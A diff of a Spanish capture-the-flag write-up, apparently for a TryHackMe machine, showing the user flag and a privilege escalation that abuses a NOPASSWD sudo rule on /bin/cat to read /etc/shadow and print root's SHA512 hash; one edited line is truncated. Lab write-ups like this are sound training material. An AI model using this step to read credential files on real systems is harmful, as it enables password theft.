@@ -49,9 +49,11 @@ ___
 Primero obtenemos la `User Flag`:
 	* `cat user.txt` ==> `THM{a_password_is_not_a_barrier}`
 
-Apenas tenemos **Footholding del Sistema**, una de las primeras cosas para _Elevar Privilegios_ es buscar **Privilegios Sudo**. Lo chequeamos con sudo -l:
-    * (root) NOPASSWD: /bin/cat
-        * GTFO Bins
+Apenas tenemos **Footholding del Sistema**, una de las primeras cosas para _Elevar Privilegios_ es buscar **Privilegios Sudo**. Lo chequeamos con `sudo -l`:
+
+
+(root) NOPASSWD: /bin/cat
+FO Bins
             * `sudo -u root /bin/cat /etc/shadow`
                 * `root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.`
                 * IA ==> SHA512
